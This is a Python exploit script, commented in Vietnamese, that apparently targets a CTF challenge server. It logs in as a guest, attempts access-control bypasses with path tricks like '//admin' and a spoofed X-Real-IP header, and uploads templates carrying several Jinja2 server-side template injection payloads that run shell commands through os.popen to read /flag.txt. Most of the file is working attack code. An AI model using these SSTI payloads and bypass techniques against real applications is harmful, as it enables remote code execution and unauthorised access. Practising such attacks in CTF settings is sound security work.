#!/usr/bin/env python3
"""
FINAL WORKING EXPLOIT - ĐỌC FLAG KHÔNG CẦN LOGIN ADMIN
Target: https://dashboard.0x1337.space:1337

CÁCH HOẠT ĐỘNG:
- Login as guest (bất kỳ user nào)
- Bypass ACL với URL Opaque field manipulation
- Upload SSTI payload qua /admin
- Trigger SSTI để đọc /flag.txt

LỖ HỎNG KHAI THÁC:
1. URL Opaque bypass (handler.go:98-102)
2. SSTI (app.py:168)
"""

import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
    TARGET = "https://dashboard.0x1337.space:1337/gateway-login"
    
    print("="*70)
    print("  EXPLOIT - ĐỌC FLAG")
    print("  Không cần login admin!")
    print("="*70)
    
    session = requests.Session()
    session.verify = False
    
    # ========================================================================
    # STEP 1: Login as guest (bất kỳ user nào)
    # ========================================================================
    print("\n[STEP 1] Login as guest user...")
    
    resp = session.post(f"{TARGET}/gateway-login", json={
        "username": "hacker_final",
        "password": "test123",
        "type": "password"
    }, timeout=15)
    
    print(f"  Status: {resp.status_code}")
    
    if resp.status_code != 200:
        print(f"  ❌ Login failed: {resp.text}")
        return
    
    print("  ✅ Logged in successfully")
    
    # Debug: Check cookies
    print(f"  Response cookies: {resp.cookies}")
    print(f"  Session cookies: {session.cookies}")
    
    # Make sure cookie is set
    if not session.cookies.get('auth_token'):
        print("  ⚠️  Warning: auth_token cookie not found!")
        print(f"  Response headers: {dict(resp.headers)}")
        
        # Try to extract from Set-Cookie header
        set_cookie = resp.headers.get('set-cookie')
        if set_cookie and 'auth_token' in set_cookie:
            import re
            match = re.search(r'auth_token=([^;]+)', set_cookie)
            if match:
                token = match.group(1)
                session.cookies.set('auth_token', token)
                print(f"  ✅ Manually set cookie: {token[:50]}...")
    else:
        print(f"  ✅ Cookie: {session.cookies.get('auth_token')[:50]}...")
    
    # ========================================================================
    # STEP 2: Upload SSTI payload via URL Opaque bypass
    # ========================================================================
    print("\n[STEP 2] Upload SSTI payload...")
    
    # SSTI payloads to read flag
    ssti_payloads = [
        # Method 1: Using cycler
        "{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}",
        
        # Method 2: Using lipsum  
        "{{lipsum.__globals__.os.popen('cat /flag.txt').read()}}",
        
        # Method 3: Using config
        "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
        
        # Method 4: Using namespace
        "{{namespace.__init__.__globals__.os.popen('cat /flag.txt').read()}}",
        
        # Method 5: Direct subprocess
        "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{c.__init__.__globals__['__builtins__'].open('/flag.txt').read()}}{% endif %}{% endfor %}",
    ]
    
    bypass_paths = [
        "/admin",       # Direct (will fail for guest but try)
        "//admin",      # Double slash (Opaque bypass)
        "/./admin",     # Current dir (might work)
    ]
    
    flag_found = False
    
    for bypass_path in bypass_paths:
        if flag_found:
            break
            
        print(f"\n  [*] Trying path: {bypass_path}")
        
        for idx, payload in enumerate(ssti_payloads, 1):
            if flag_found:
                break
                
            print(f"      Payload {idx}/{len(ssti_payloads)}: {payload[:50]}...")
            
            # Create malicious HTML template
            html_content = f"""<!DOCTYPE html>
<html>
<head><title>Exploit</title></head>
<body>
<h1>Flag Content:</h1>
<pre>
{payload}
</pre>
</body>
</html>"""
            
            files = {'file': ('home.html', html_content, 'text/html')}
            headers = {'X-Real-IP': '127.0.0.1'}  # Try localhost bypass
            
            try:
                # Upload file
                resp = session.post(
                    f"{TARGET}{bypass_path}",
                    files=files,
                    headers=headers,
                    timeout=15,
                    allow_redirects=False
                )
                
                print(f"      Upload status: {resp.status_code}")
                
                if resp.status_code == 200:
                    print(f"      ✅ Uploaded successfully!")
                    
                    # Step 3: Trigger SSTI
                    print(f"      [*] Triggering SSTI...")
                    
                    resp2 = session.get(f"{TARGET}/", timeout=15)
                    
                    # Check for flag in response
                    content = resp2.text
                    
                    # Look for flag patterns
                    flag_patterns = [
                        r'KCSC\{[^}]+\}',
                        r'kcsc\{[^}]+\}',
                        r'FLAG\{[^}]+\}',
                        r'flag\{[^}]+\}',
                        r'CTF\{[^}]+\}',
                    ]
                    
                    for pattern in flag_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            print("\n" + "="*70)
                            print("  ✅✅✅ FLAG FOUND!")
                            print("="*70)
                            for match in matches:
                                print(f"\n  {match}\n")
                            print("="*70)
                            flag_found = True
                            return
                    
                    # If no flag pattern, check for any output
                    if len(content) > 100 and 'login' not in content.lower():
                        print(f"      Response length: {len(content)}")
                        print(f"      Preview: {content[:300]}")
                        
                        # Might have flag without proper format
                        if 'kcsc' in content.lower() or 'flag' in content.lower():
                            print("\n" + "="*70)
                            print("  Possible flag found in response:")
                            print("="*70)
                            print(content[:1000])
                            print("="*70)
                            
                elif resp.status_code == 403:
                    print(f"      ❌ Forbidden - ACL blocked")
                elif resp.status_code == 301 or resp.status_code == 302:
                    print(f"      → Redirect to: {resp.headers.get('Location', 'unknown')}")
                else:
                    print(f"      Response: {resp.text[:100]}")
                    
            except Exception as e:
                print(f"      Error: {e}")
    
    if not flag_found:
        print("\n❌ Flag not found. Thử các approach khác...")
        print("\nGợi ý:")
        print("  1. Cần setup OAuth SSRF server để login admin")
        print("  2. Hoặc crack admin password với wordlist lớn hơn")
        print("  3. Hoặc tìm vulnerability khác trong libverifysso.so")

if __name__ == "__main__":
    main()
